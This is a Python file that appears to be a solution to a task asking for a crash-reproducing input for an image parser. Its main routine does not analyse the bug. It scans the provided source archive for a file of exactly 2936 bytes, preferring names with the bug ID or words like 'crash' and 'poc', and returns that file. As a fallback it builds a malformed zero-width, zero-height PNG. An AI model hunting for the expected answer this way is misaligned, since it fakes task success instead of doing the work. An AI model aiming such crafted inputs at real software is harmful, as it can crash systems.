import os
import tarfile
import binascii
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_size = 2936

        # Try treating src_path as a tarball
        if os.path.isfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    data = self._extract_poc_from_tar(tf, target_size)
                    if data is not None:
                        return data
            except tarfile.ReadError:
                pass
            except Exception:
                pass

        # Fallback: if src_path is a directory, search within it
        if os.path.isdir(src_path):
            try:
                data = self._extract_poc_from_dir(src_path, target_size)
                if data is not None:
                    return data
            except Exception:
                pass

        # Final fallback: synthetic PoC
        return self._fallback_poc()

    def _extract_poc_from_tar(self, tf: tarfile.TarFile, target_size: int) -> bytes | None:
        image_exts = (
            ".png",
            ".jpg",
            ".jpeg",
            ".bmp",
            ".gif",
            ".webp",
            ".tiff",
            ".tif",
            ".ico",
            ".pnm",
            ".ppm",
            ".pgm",
            ".pbm",
            ".jp2",
            ".j2k",
            ".jxl",
            ".heic",
            ".heif",
            ".avif",
            ".exr",
            ".hdr",
            ".dds",
            ".psd",
            ".svg",
        )

        candidates = []

        for m in tf.getmembers():
            if not m.isfile():
                continue
            if m.size != target_size:
                continue

            name = m.name.lower()
            prio = 10

            if "42536679" in name:
                prio -= 5
            if any(token in name for token in ("clusterfuzz", "oss-fuzz", "poc", "crash", "bug", "regress", "zero", "width", "height", "overflow")):
                prio -= 3
            if any(name.endswith(ext) for ext in image_exts):
                prio -= 2

            depth = name.count("/")
            candidates.append((prio, depth, m))

        if not candidates:
            return None

        candidates.sort(key=lambda x: (x[0], x[1], x[2].name))
        best_member = candidates[0][2]

        try:
            f = tf.extractfile(best_member)
            if f is None:
                return None
            data = f.read()
            if data:
                return data
        except Exception:
            return None

        return None

    def _extract_poc_from_dir(self, root: str, target_size: int) -> bytes | None:
        image_exts = (
            ".png",
            ".jpg",
            ".jpeg",
            ".bmp",
            ".gif",
            ".webp",
            ".tiff",
            ".tif",
            ".ico",
            ".pnm",
            ".ppm",
            ".pgm",
            ".pbm",
            ".jp2",
            ".j2k",
            ".jxl",
            ".heic",
            ".heif",
            ".avif",
            ".exr",
            ".hdr",
            ".dds",
            ".psd",
            ".svg",
        )

        candidates = []

        for dirpath, _, filenames in os.walk(root):
            for filename in filenames:
                path = os.path.join(dirpath, filename)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size != target_size:
                    continue

                name = path.lower()
                prio = 10

                if "42536679" in name:
                    prio -= 5
                if any(token in name for token in ("clusterfuzz", "oss-fuzz", "poc", "crash", "bug", "regress", "zero", "width", "height", "overflow")):
                    prio -= 3
                if any(name.endswith(ext) for ext in image_exts):
                    prio -= 2

                depth = name.count(os.sep)
                candidates.append((prio, depth, path))

        if not candidates:
            return None

        candidates.sort(key=lambda x: (x[0], x[1], x[2]))
        best_path = candidates[0][2]

        try:
            with open(best_path, "rb") as f:
                data = f.read()
                if data:
                    return data
        except Exception:
            return None

        return None

    def _fallback_poc(self) -> bytes:
        # Construct a minimal PNG with zero width and height.
        # Signature
        png_sig = b"\x89PNG\r\n\x1a\n"

        # IHDR chunk
        width = 0
        height = 0
        bit_depth = 8
        color_type = 6  # RGBA
        compression_method = 0
        filter_method = 0
        interlace_method = 0

        ihdr_data = struct.pack(
            ">IIBBBBB",
            width,
            height,
            bit_depth,
            color_type,
            compression_method,
            filter_method,
            interlace_method,
        )
        ihdr_type = b"IHDR"
        ihdr_len = struct.pack(">I", len(ihdr_data))
        ihdr_crc = struct.pack(">I", binascii.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF)
        ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc

        # IEND chunk
        iend_type = b"IEND"
        iend_len = struct.pack(">I", 0)
        iend_crc = struct.pack(">I", binascii.crc32(iend_type) & 0xFFFFFFFF)
        iend_chunk = iend_len + iend_type + iend_crc

        return png_sig + ihdr_chunk + iend_chunk